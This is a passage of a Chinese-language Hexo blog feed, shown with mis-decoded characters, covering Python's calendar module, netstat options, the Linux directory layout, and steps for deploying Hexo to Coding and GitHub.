è¿”å›ä¸€ä¸ªæ•´æ•°çš„å•å±‚åµŒå¥—åˆ—è¡¨ã€‚æ¯ä¸ªå­åˆ—è¡¨è£…è½½ä»£è¡¨ä¸€ä¸ªæ˜ŸæœŸçš„æ•´æ•°ã€‚Yearå¹´monthæœˆå¤–çš„æ—¥æœŸéƒ½è®¾ä¸º0;èŒƒå›´å†…çš„æ—¥å­éƒ½ç”±è¯¥æœˆç¬¬å‡ æ—¥è¡¨ç¤ºï¼Œä»1å¼€å§‹ã€‚</td></tr><tr><td align="left">7</td><td align="left"><strong>calendar.monthrange(year,month)</strong> è¿”å›ä¸¤ä¸ªæ•´æ•°ã€‚ç¬¬ä¸€ä¸ªæ˜¯è¯¥æœˆçš„æ˜ŸæœŸå‡ çš„æ—¥æœŸç ï¼Œç¬¬äºŒä¸ªæ˜¯è¯¥æœˆçš„æ—¥æœŸç ã€‚æ—¥ä»0ï¼ˆæ˜ŸæœŸä¸€ï¼‰åˆ°6ï¼ˆæ˜ŸæœŸæ—¥ï¼‰;æœˆä»1åˆ°12ã€‚</td></tr><tr><td align="left">8</td><td align="left"><strong>calendar.prcal(year,w=2,l=1,c=6)</strong> ç›¸å½“äº **print calendar.calendar(year,w=2,l=1,c=6)**ã€‚</td></tr><tr><td align="left">9</td><td align="left"><strong>calendar.prmonth(year,month,w=2,l=1)</strong> ç›¸å½“äº <strong>print calendar.month(year,month,w=2,l=1)</strong> ã€‚</td></tr><tr><td align="left">10</td><td align="left"><strong>calendar.setfirstweekday(weekday)</strong> è®¾ç½®æ¯å‘¨çš„èµ·å§‹æ—¥æœŸç ã€‚0ï¼ˆæ˜ŸæœŸä¸€ï¼‰åˆ°6ï¼ˆæ˜ŸæœŸæ—¥ï¼‰ã€‚</td></tr><tr><td align="left">11</td><td align="left"><strong>calendar.timegm(tupletime)</strong> å’Œtime.gmtimeç›¸åï¼šæ¥å—ä¸€ä¸ªæ—¶é—´å…ƒç»„å½¢å¼ï¼Œè¿”å›è¯¥æ—¶åˆ»çš„æ—¶é—´æˆ³ï¼ˆ1970çºªå…ƒåç»è¿‡çš„æµ®ç‚¹ç§’æ•°ï¼‰ã€‚</td></tr><tr><td align="left">12</td><td align="left"><strong>calendar.weekday(year,month,day)</strong> è¿”å›ç»™å®šæ—¥æœŸçš„æ—¥æœŸç ã€‚0ï¼ˆæ˜ŸæœŸä¸€ï¼‰åˆ°6ï¼ˆæ˜ŸæœŸæ—¥ï¼‰ã€‚æœˆä»½ä¸º 1ï¼ˆä¸€æœˆï¼‰ åˆ° 12ï¼ˆ12æœˆï¼‰ã€‚</td></tr></tbody></table><p>å¾…æ›´æ–°</p>]]></content>
      
      
      <categories>
          
          <category> è¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxå‘½ä»¤</title>
      <link href="/2021/09/08/linux-ming-ling/"/>
      <url>/2021/09/08/linux-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxå‘½ä»¤"><a href="#linuxå‘½ä»¤" class="headerlink" title="linuxå‘½ä»¤"></a>linuxå‘½ä»¤</h1><h2 id="netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯"><a href="#netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯" class="headerlink" title="netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯"></a>netstat-æŸ¥çœ‹Linuxä¸­ç½‘ç»œç³»ç»ŸçŠ¶æ€ä¿¡æ¯</h2><p>é€‰é¡¹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-aæˆ–--allï¼šæ˜¾ç¤ºæ‰€æœ‰è¿çº¿ä¸­çš„Socketï¼›-A<span class="token operator">&lt;</span>ç½‘ç»œç±»å‹<span class="token operator">&gt;</span>æˆ–--<span class="token operator">&lt;</span>ç½‘ç»œç±»å‹<span class="token operator">&gt;</span>ï¼šåˆ—å‡ºè¯¥ç½‘ç»œç±»å‹è¿çº¿ä¸­çš„ç›¸å…³åœ°å€ï¼›-cæˆ–--continuousï¼šæŒç»­åˆ—å‡ºç½‘ç»œçŠ¶æ€ï¼›-Cæˆ–--cacheï¼šæ˜¾ç¤ºè·¯ç”±å™¨é…ç½®çš„å¿«å–ä¿¡æ¯ï¼›-eæˆ–--extendï¼šæ˜¾ç¤ºç½‘ç»œå…¶ä»–ç›¸å…³ä¿¡æ¯ï¼›-Fæˆ–--fibï¼šæ˜¾ç¤ºFIBï¼›-gæˆ–--groupsï¼šæ˜¾ç¤ºå¤šé‡å¹¿æ’­åŠŸèƒ½ç¾¤ç»„ç»„å‘˜åå•ï¼›-hæˆ–--helpï¼šåœ¨çº¿å¸®åŠ©ï¼›-iæˆ–--interfacesï¼šæ˜¾ç¤ºç½‘ç»œç•Œé¢ä¿¡æ¯è¡¨å•ï¼›-læˆ–--listeningï¼šæ˜¾ç¤ºç›‘æ§ä¸­çš„æœåŠ¡å™¨çš„Socketï¼›-Mæˆ–--masqueradeï¼šæ˜¾ç¤ºä¼ªè£…çš„ç½‘ç»œè¿çº¿ï¼›-næˆ–--numericï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›-Næˆ–--netlinkæˆ–--symbolicï¼šæ˜¾ç¤ºç½‘ç»œç¡¬ä»¶å¤–å›´è®¾å¤‡çš„ç¬¦å·è¿æ¥åç§°ï¼›-oæˆ–--timersï¼šæ˜¾ç¤ºè®¡æ—¶å™¨ï¼›-pæˆ–--programsï¼šæ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨Socketçš„ç¨‹åºè¯†åˆ«ç å’Œç¨‹åºåç§°ï¼›-ræˆ–--routeï¼šæ˜¾ç¤ºRouting Tableï¼›-sæˆ–--statisticeï¼šæ˜¾ç¤ºç½‘ç»œå·¥ä½œä¿¡æ¯ç»Ÿè®¡è¡¨ï¼›-tæˆ–--tcpï¼šæ˜¾ç¤ºTCPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µï¼›-uæˆ–--udpï¼šæ˜¾ç¤ºUDPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µï¼›-væˆ–--verboseï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›-Væˆ–--versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼›-wæˆ–--rawï¼šæ˜¾ç¤ºRAWä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µï¼›-xæˆ–--unixï¼šæ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š<span class="token string">"-A unix"</span>å‚æ•°ç›¸åŒï¼›--ipæˆ–--inetï¼šæ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š<span class="token string">"-A inet"</span>å‚æ•°ç›¸åŒã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxç³»ç»Ÿç›®å½•åŠŸèƒ½</title>
      <link href="/2021/09/08/linux-xi-tong-mu-lu-gong-neng/"/>
      <url>/2021/09/08/linux-xi-tong-mu-lu-gong-neng/</url>
      
        <content type="html"><![CDATA[<h1 id="linuxç³»ç»Ÿç›®å½•åŠŸèƒ½"><a href="#linuxç³»ç»Ÿç›®å½•åŠŸèƒ½" class="headerlink" title="linuxç³»ç»Ÿç›®å½•åŠŸèƒ½"></a>linuxç³»ç»Ÿç›®å½•åŠŸèƒ½</h1><p><img src="https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg" alt="img"></p><table><thead><tr><th>ç›®å½•åç§°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>/</td><td>ä¸»ç›®å½•</td></tr><tr><td>/bin</td><td>å­˜æ”¾äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶ï¼‰ï¼ˆæ™®é€šç”¨æˆ·ç³»ç»Ÿå‘½ä»¤ï¼‰</td></tr><tr><td>/sbin</td><td>å­˜æ”¾ç®¡ç†å‘˜ä½¿ç”¨çš„ç³»ç»Ÿå‘½ä»¤</td></tr><tr><td>/boot</td><td>å­˜æ”¾å¯åŠ¨ç³»ç»Ÿçš„çš„ä¸€äº›æ ¸å¿ƒæ–‡ä»¶</td></tr><tr><td>/dev</td><td>linuxçš„å¤–éƒ¨è®¾å¤‡ï¼Œä»¥æ–‡ä»¶æ–¹å¼è®¿é—®</td></tr><tr><td>/etc</td><td>å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½•ï¼ˆå…¨å±€é…ç½®æ–‡ä»¶ï¼‰</td></tr><tr><td>/home</td><td>ç”¨æˆ·ä¸»ç›®å½•ï¼Œä»¥ç”¨æˆ·åå‘½å</td></tr><tr><td>/lib</td><td>å­˜æ”¾ç€32ä½ç³»ç»Ÿæœ€åŸºæœ¬çš„åŠ¨æ€è¿æ¥å…±äº«åº“</td></tr><tr><td>/lib64</td><td>å­˜æ”¾ç€64ä½ç³»ç»Ÿæœ€åŸºæœ¬çš„åŠ¨æ€è¿æ¥å…±äº«åº“</td></tr><tr><td>/lost+found</td><td>ç³»ç»Ÿéæ³•å…³æœºåä¼šå­˜æ”¾ä¸€äº›æ–‡ä»¶</td></tr><tr><td>/root</td><td>è¶…çº§ç”¨æˆ·çš„å®¶ç›®å½•</td></tr><tr><td>/run</td><td>ä¸´æ—¶æ–‡ä»¶ç³»ç»Ÿï¼Œå­˜å‚¨ç³»ç»Ÿå¯åŠ¨ä»¥æ¥çš„ä¿¡æ¯</td></tr><tr><td>/media</td><td>ç±»windowsçš„å…¶ä»–è®¾å¤‡ï¼Œä¾‹å¦‚Uç›˜ã€å…‰é©±ç­‰</td></tr><tr><td>/mnt</td><td>ç³»ç»Ÿæä¾›è¯¥ç›®å½•æ˜¯ä¸ºäº†è®©ç”¨æˆ·ä¸´æ—¶æŒ‚è½½åˆ«çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä¾‹å¦‚å¤–éƒ¨ç¡¬ç›˜</td></tr><tr><td>/opt</td><td>ç»™ä¸»æœºé¢å¤–å®‰è£…è½¯ä»¶æ‰€æ‘†æ”¾çš„ç›®å½•ï¼ˆç¬¬ä¸‰æ–¹è½¯ä»¶ï¼‰</td></tr><tr><td>/proc</td><td>å­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œè¿™ä¸ªç›®å½•æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ç›®å½•ï¼Œå®ƒæ˜¯ç³»ç»Ÿå†…å­˜çš„æ˜ å°„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•æ¥è·å–ç³»ç»Ÿä¿¡æ¯ï¼Œè¿™ä¸ªç›®å½•çš„å†…å®¹ä¸åœ¨ç¡¬ç›˜ä¸Šè€Œæ˜¯åœ¨å†…å­˜é‡Œ</td></tr><tr><td>/srv</td><td>å­˜æ”¾ä¸€äº›æœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦æå–çš„æ•°æ®</td></tr><tr><td>/sys</td><td>ç”¨äºè¾“å‡ºå½“å‰ç³»ç»Ÿç¡¬ä»¶è®¾å¤‡ç›¸å…³ä¿¡æ¯è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>/tmp</td><td>å­˜æ”¾ä¸€äº›ä¸´æ—¶æ–‡ä»¶çš„ï¼Œå¯ä»¥éšä¾¿æ“ä½œ</td></tr><tr><td>/selinux</td><td>ç±»ä¼¼äº windows çš„é˜²ç«å¢™</td></tr><tr><td>/usr</td><td>ç”¨äºå­˜å‚¨ç³»ç»Ÿè½¯ä»¶èµ„æºï¼Œç±»ä¼¼äº windows ä¸‹çš„ program files ç›®å½•</td></tr><tr><td>/usr/bin</td><td>ç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºï¼Œä¸ç³»ç»Ÿå¯åŠ¨æ— å…³</td></tr><tr><td>/usr/sbin</td><td>è¶…çº§ç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºï¼Œä¸ç³»ç»Ÿå¯åŠ¨æ— å…³</td></tr><tr><td>/usr/src</td><td>å†…æ ¸æºä»£ç é»˜è®¤çš„æ”¾ç½®ç›®å½•</td></tr><tr><td>/usr/lib</td><td>åº“æ–‡ä»¶</td></tr><tr><td>/usr/local/</td><td>æ‰‹å·¥å®‰è£…çš„è½¯ä»¶ä¿å­˜ä½ç½®</td></tr><tr><td>/usr/share/</td><td>åº”ç”¨ç¨‹åºçš„èµ„æºæ–‡ä»¶ä¿å­˜ä½ç½®</td></tr><tr><td>/usr/include</td><td>C/C++ ç­‰ç¼–ç¨‹è¯­è¨€å¤´æ–‡ä»¶çš„æ”¾ç½®ç›®å½•</td></tr><tr><td>/var</td><td>ç»å¸¸è¢«ä¿®æ”¹çš„ç›®å½•æ”¾åœ¨è¿™ä¸ªç›®å½•ï¼Œä¾‹å¦‚æ—¥å¿—ï¼ŒåŠ¨æ€çš„</td></tr><tr><td>/var/lib</td><td>ç¨‹åºè¿è¡Œä¸­éœ€è¦è°ƒç”¨æˆ–æ”¹å˜çš„æ•°æ®ä¿å­˜ä½ç½®</td></tr><tr><td>/var/log/</td><td>ç™»é™†æ–‡ä»¶æ”¾ç½®çš„ç›®å½•</td></tr><tr><td>/var/run/</td><td>ä¸€äº›æœåŠ¡å’Œç¨‹åºè¿è¡Œåï¼ŒPIDï¼ˆè¿›ç¨‹ IDï¼‰ä¿å­˜ä½ç½®</td></tr><tr><td>/etc/sysconfig/network-scripts/ifcfg-eth0</td><td>é…ç½®ç½‘å€åŠGWï¼Œä½¿å¾—ç½‘å¡ç”Ÿæ•ˆ</td></tr><tr><td>/etc/sysconfig/network</td><td>ä¿®æ”¹æœºå™¨ååŠç½‘å¡å¯åŠ¨ï¼Œç½‘å…³ç­‰é…ç½®</td></tr><tr><td>/etc/resolv.conf</td><td>è®¾ç½®æœ¬æœºçš„å®¢æˆ·ç«¯DNS</td></tr><tr><td>/etc/hosts</td><td>è®¾å®šç”¨æˆ·IPä¸åå­—çš„å¯¹åº”è¡¨</td></tr><tr><td>/etc/fstab</td><td>è®°å½•å¼€æœºè¦mountçš„æ–‡ä»¶è®°å½•</td></tr><tr><td>/etc/inittab</td><td>å®šå¯åŠ¨æ—¶initè¿›ç¨‹æŠŠç³»ç»Ÿè®¾ç½®æˆæ€æ ·çš„runlevelï¼Œä»¥åŠåŠ è½½ç›¸å…³çš„å¯åŠ¨æ–‡ä»¶</td></tr><tr><td>/etc/exports</td><td>è®¾å®šNFSç½‘ç»œæ–‡ä»¶ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶</td></tr><tr><td>/etc/init.d</td><td>å­˜æ”¾ç³»ç»Ÿæˆ–è€…æœåŠ¡å™¨ä»¥systemVæ¨¡å¼å¯åŠ¨çš„è„šæœ¬</td></tr><tr><td>/etc/xinit.d</td><td>å¦‚æœæœåŠ¡å™¨æ˜¯é€šè¿‡xinetdæ¨¡å¼è¿è¡Œçš„ï¼Œä»–çš„è„šæœ¬è¦æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹</td></tr><tr><td>/etc/profile</td><td>ç³»ç»Ÿå…¨å±€ç¯å¢ƒå˜é‡é…ç½®è·¯å¾„</td></tr><tr><td>/etc/profile.d</td><td>åŠ è½½ç™»å½•ç¨‹åºçš„ä¸€ä¸ªç›®å½•å‘½ä»¤æˆ–æ–‡ä»¶ç‹¬ç«‹å­˜åœ¨</td></tr><tr><td>/etc/issue</td><td>è®°å½•ç”¨æˆ·ç™»å½•å‰çš„æ˜¾ç¤ºä¿¡æ¯</td></tr><tr><td>/etc/motd</td><td>ç™»å½•æé†’</td></tr><tr><td>/etc/redhat-release</td><td>ç‰ˆæœ¬å·å’Œåç§°ä¿¡æ¯</td></tr><tr><td>/etc/group</td><td>è®¾å®šç”¨æˆ·çš„ç»„åä¸ç›¸å…³ä¿¡æ¯</td></tr><tr><td>/etc/passwd</td><td>è´¦å·ä¿¡æ¯</td></tr><tr><td>/etc/shadow</td><td>å¯†ç ä¿¡æ¯</td></tr><tr><td>/etc/sudoers</td><td>å¯ä»¥ç”¨sudoå‘½ä»¤é…ç½®çš„æ–‡ä»¶</td></tr><tr><td>/etc/securetty</td><td>è®¾å®šå“ªäº›ç»ˆç«¯å¯ä»¥è®©rootç™»å½•</td></tr><tr><td>/etc/rsyslof.conf</td><td>æ—¥å¿—è®¾ç½®æ–‡ä»¶ï¼Œåœ¨6.4 chkconfig â€“list rsyslog</td></tr><tr><td>/usr/local</td><td>ç”¨æ¥å­˜æ”¾ç”¨æˆ·è‡ªç¼–è¯‘å®‰è£…è½¯ä»¶ç›®å½•ï¼Œé€šè¿‡æºç åŒ…å®‰è£…çš„è½¯ä»¶ï¼ŒæœªæŒ‡å®šå®‰è£…è·¯å¾„</td></tr><tr><td>/var/log/message</td><td>ç³»ç»Ÿé»˜è®¤æ—¥å¿—æ–‡ä»¶ï¼Œ/var/logå„ç§æ—¥å¿—å­˜æ”¾åœ°</td></tr><tr><td>/var/log/secure</td><td>è®°å½•ç™»å½•ç³»ç»Ÿå­˜å–ä¿¡æ¯çš„æ–‡ä»¶ï¼Œç³»ç»Ÿæ—¥å¿—çš„å®‰å…¨ä¿¡æ¯</td></tr><tr><td>/var/log/wtmp</td><td>è®°å½•ç™»å½•è€…çš„ä¿¡æ¯æ–‡ä»¶</td></tr><tr><td>/var/spool/cron/root</td><td>å®šæ—¶ä»»åŠ¡crontabé»˜è®¤ç›®å½•ï¼ŒæŒ‰ç”¨æˆ·åå‘½åçš„æ–‡ä»¶</td></tr><tr><td>/var/spool/mail</td><td>ç³»ç»Ÿç”¨æˆ·é‚®ä»¶å­˜æ”¾ç›®å½•</td></tr><tr><td>/var/spool/clientmqueuesendmail</td><td>é‚®ä»¶ä¸´æ—¶å­˜æ”¾ç›®å½•</td></tr><tr><td>/etc/login.defs</td><td>æ‰€æœ‰ç”¨æˆ·ç™»å½•æ—¶çš„ç¼ºçœé…ç½®</td></tr><tr><td>/etc/modprobe.conf</td><td>å†…æ ¸æ¨¡å—é¢å¤–å‚æ•°è®¾å®šé‡è¢«å°½ï¼Œæ— æ³•å†™å…¥æ–‡ä»¶</td></tr><tr><td>/proc</td><td>è™šæ‹Ÿç›®å½•æ˜¯å†…å­˜çš„æ˜ å°„</td></tr><tr><td>/etc/sysctl.conf</td><td>æ”¾åœ¨å…¶ä¸‹é¢æ°¸ä¹…ç”Ÿæ•ˆ</td></tr><tr><td>/proc/cpuinfo</td><td>å…³äºå¤„ç†å™¨çš„ä¿¡æ¯</td></tr><tr><td>/proc/meminfo</td><td>ç³»ç»Ÿå†…å­˜ä¿¡æ¯</td></tr><tr><td>/proc/interrupts</td><td>æ­£åœ¨ä½¿ç”¨çš„ä¸­æ–­ï¼Œå’Œæ›¾ç»æœ‰è¿‡å¤šå°‘ä¸ªä¸­æ–­</td></tr><tr><td>/proc/loadavg</td><td>ç³»ç»Ÿè´Ÿè½½ä¿¡æ¯</td></tr><tr><td>/etc/DIR_COLORS</td><td>è®¾å®šé¢œè‰²</td></tr><tr><td>/etc/host.conf</td><td>æ–‡ä»¶è¯´æ˜ç”¨æˆ·çš„ç³»ç»Ÿå¦‚ä½•æŸ¥è¯¢èŠ‚ç‚¹</td></tr><tr><td>/etc/hosts.allow</td><td>é€šè¿‡å®ƒå¯ä»¥å…è®¸æŸä¸ªipæˆ–è€…ipæ®µçš„å®¢æˆ·è®¿é—®linuxçš„æŸé¡¹æœåŠ¡</td></tr><tr><td>/etc/hosts.deny</td><td>é€šè¿‡å®ƒå¯ä»¥æ‹’ç»æŸä¸ªipæˆ–è€…ipæ®µçš„å®¢æˆ·è®¿é—®linuxçš„æŸé¡¹æœåŠ¡</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éƒ¨ç½²hexoåˆ°coding</title>
      <link href="/2021/08/13/bu-shu-hexo-dao-coding/"/>
      <url>/2021/08/13/bu-shu-hexo-dao-coding/</url>
      
        <content type="html"><![CDATA[<h1 id="éƒ¨ç½²hexoåˆ°coding"><a href="#éƒ¨ç½²hexoåˆ°coding" class="headerlink" title="éƒ¨ç½²hexoåˆ°coding"></a>éƒ¨ç½²hexoåˆ°coding</h1><h2 id="åˆ›å»ºä»“åº“"><a href="#åˆ›å»ºä»“åº“" class="headerlink" title="åˆ›å»ºä»“åº“"></a>åˆ›å»ºä»“åº“</h2><p>åˆ›å»ºè´¦å·ç™»å½•</p><p>æ–°å»ºé¡¹ç›®ï¼Œåä¸º<code>å›¢é˜ŸåŸŸå</code></p><p>ç‚¹å‡»<code>ä»£ç ä»“åº“</code>æ–°å»ºä¸€ä¸ªä»“åº“</p><p>åä¸º<code>å›¢é˜ŸåŸŸå</code>ï¼Œå‹¾é€‰<code>readme</code>ï¼Œå…¬æœ‰</p><p>ä¹‹åä¾¿å¯ä»¥é€šè¿‡<code>å›¢é˜ŸåŸŸå.coding.me</code>æ¥è®¿é—®åšå®¢</p><h2 id="å»ºç«‹è”ç³»"><a href="#å»ºç«‹è”ç³»" class="headerlink" title="å»ºç«‹è”ç³»"></a>å»ºç«‹è”ç³»</h2><p><code>c/Users/youuser/.ssh/id_rsa.pub</code>é‡Œé¢çš„å†…å®¹å³æ˜¯åŒæ–¹é€šä¿¡çš„å¯†é’¥</p><p>å°†å¯†é’¥å¤åˆ¶åˆ° ä¸ªäººè´¦æˆ·è®¾ç½®-&gt;SSHå…¬é’¥</p><h2 id="æ·»åŠ é…ç½®æ–‡ä»¶"><a href="#æ·»åŠ é…ç½®æ–‡ä»¶" class="headerlink" title="æ·»åŠ é…ç½®æ–‡ä»¶"></a>æ·»åŠ é…ç½®æ–‡ä»¶</h2><p>æ·»åŠ åˆ°é…ç½®æ–‡ä»¶<code>.config.yml</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">- type: <span class="token function">git</span>  repository: git@e.coding.net:å›¢é˜ŸåŸŸå/å›¢é˜ŸåŸŸå/å›¢é˜ŸåŸŸå.git<span class="token punctuation">(</span>ä½ çš„ä»“åº“åœ°å€<span class="token punctuation">)</span>  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p>æŒç»­éƒ¨ç½²-&gt;ç½‘ç«™æ‰˜ç®¡-&gt;æ–°å»ºç½‘ç«™</p><p>é™æ€ç½‘ç«™ï¼Œå¯¼å…¥é¡¹ç›®ï¼Œç°æœ‰ä»“åº“ï¼Œæ¥æºå°±æ˜¯åˆšæ‰åˆ›å»ºçš„ä»“åº“åï¼Œé™æ€ç½‘ç«™ï¼Œé¦™æ¸¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo chexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éƒ¨ç½²hexoåˆ°github</title>
      <link href="/2021/08/13/bu-shu-hexo-dao-github/"/>
      <url>/2021/08/13/bu-shu-hexo-dao-github/</url>
      
        <content type="html"><![CDATA[<h1 id="éƒ¨ç½²hexoåˆ°github"><a href="#éƒ¨ç½²hexoåˆ°github" class="headerlink" title="éƒ¨ç½²hexoåˆ°github"></a>éƒ¨ç½²hexoåˆ°github</h1><p>æˆ‘çš„æœ¬åœ°æœºå™¨æ˜¯win10</p><h2 id="è®¾ç½®github"><a href="#è®¾ç½®github" class="headerlink" title="è®¾ç½®github"></a>è®¾ç½®github</h2><p>ç™»å½•githubè´¦å·ï¼Œå°½é‡ä¸€ä¸ªä½ å–œæ¬¢çš„ç”¨æˆ·å</p><p>åˆ›å»ºä¸€ä¸ªä»“åº“ï¼Œä»“åº“åä¸º <code>ç”¨æˆ·å.github.io</code>ï¼Œè®¾ç½®å…¬æœ‰ï¼Œæ·»åŠ readme</p><p>å¾…ä¼šé€šè¿‡hexoå°†é™æ€é¡µé¢éƒ¨ç½²åˆ°<code>https://ç”¨æˆ·å.github.io</code></p><p>è¿™ä¸ªurlå°±æ˜¯ä½ çš„åšå®¢åœ°å€</p><h2 id="å®‰è£…git"><a href="#å®‰è£…git" class="headerlink" title="å®‰è£…git"></a>å®‰è£…git</h2><p>å»å®˜ç½‘ä¸‹è½½æƒ³è¦çš„ç‰ˆæœ¬<a href="https://git-scm.com/downloads">Git - Downloads (git-scm.com)</a></p><p>å‚»ç“œå¼å®‰è£…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token parameter variable">--version</span> <span class="token comment">#æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å®‰è£…Node-js"><a href="#å®‰è£…Node-js" class="headerlink" title="å®‰è£…Node.js"></a>å®‰è£…Node.js</h2><p><a href="https://nodejs.org/en/download/">Download | Node.js (nodejs.org)</a>é€‰æ‹©ç‰ˆæœ¬å‚»ç“œå¼å®‰è£…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¢å›½å†…æºåŠ é€Ÿ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æœ¬æœºä¸githubå»ºç«‹è¿æ¥"><a href="#æœ¬æœºä¸githubå»ºç«‹è¿æ¥" class="headerlink" title="æœ¬æœºä¸githubå»ºç«‹è¿æ¥"></a>æœ¬æœºä¸githubå»ºç«‹è¿æ¥</h2><p>æ‰“å¼€Git Bashï¼Œå³é”®æˆ–è€…æœç´¢æ‰“å¼€</p><p>è®¾ç½®gité…ç½®ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"ä½ çš„GitHubç”¨æˆ·å"</span><span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"ä½ çš„GitHubæ³¨å†Œé‚®ç®±"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç”Ÿæˆsshå¯†é’¥æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token parameter variable">-C</span> <span class="token string">"ä½ çš„GitHubæ³¨å†Œé‚®ç®±"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè¿ç»­ä¸‰æ¬¡å›è½¦</p><p><code>c/Users/youuser/.ssh/id_rsa.pub</code>é‡Œé¢çš„å†…å®¹å³æ˜¯åŒæ–¹é€šä¿¡çš„å¯†é’¥</p><p>å°†å¯†é’¥å¤åˆ¶åˆ°github-&gt;å³ä¸Šè§’å¤´åƒ-&gt;settings-&gt;SSH and GPG keysï¼Œä¿å­˜</p><p>æœ¬æœºæµ‹è¯•è¿æ¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> <span class="token parameter variable">-T</span> git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å®‰è£…Hexo"><a href="#å®‰è£…Hexo" class="headerlink" title="å®‰è£…Hexo"></a>å®‰è£…Hexo</h2><p>åˆ›å»ºä¸€ä¸ªå­˜æ”¾hexoçš„æ–‡ä»¶ï¼Œè¿›å…¥è¿™ä¸ªç›®å½•å³é”®å‘½ä»¤è¡Œæ‰“å¼€</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> <span class="token parameter variable">-g</span> hexo-cli <span class="token comment">#å®‰è£…hexo</span><span class="token function">npm</span> update hexo <span class="token parameter variable">-g</span> <span class="token comment">#å‡çº§hexo</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆå§‹åŒ–hexo</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo init blog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµè§ˆæµ‹è¯•</p><pre class="line-numbers language-bash" data-language="bash"><code 